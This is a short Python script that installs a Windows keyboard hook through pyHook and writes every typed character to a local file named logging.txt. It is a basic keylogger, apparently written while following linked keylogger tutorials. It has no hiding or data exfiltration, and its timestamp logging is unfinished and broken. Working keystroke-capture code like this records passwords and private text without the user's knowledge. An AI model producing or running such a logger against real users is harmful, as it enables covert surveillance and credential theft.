import pythoncom, pyHook, sys, logging
import time, datetime

file_log = 'logging.txt'
prev_time_millis = 0

def OnKeyboardEvent(event):
    # logging module set filename, deugging level and ASCII format
    logging.basicConfig(filename = file_log, level = logging.DEBUG, format = '%(message)s')
    # log character
    chr(event.Ascii)        # get char that represents unicode of event
    logging.log(10, chr(event.Ascii))       # write to logging filename 'logging'
    
    # TODO: log the time of the event
    # return true and watch for next event
    # fmt_time = '%H:%M:%S'

    logging.Formatter(fmt = '%(asctime)s.%(msecs)03d', datefmt = '%Y-%m-%d,%H:%M:%S')
    logging.debug('time')   # present time

    return True

# hook on windows evetns
hooksMan = pyHook.HookManager()
# set hook to keyboard
hooksMan.KeyDown = OnKeyboardEvent
# keydown to watch for keypresses
hooksMan.HookKeyboard()
# capture key messages
pythoncom.PumpMessages()

# https://www.youtube.com/watch?v=8BiOPBsXh0g&list=PLMjIyH4vq-JcQf6CkwPLEx2pZNX5RPd6E&index=13&t=0s
# https://geekviews.tech/how-to-make-a-simple-and-powerfull-python-keylogger/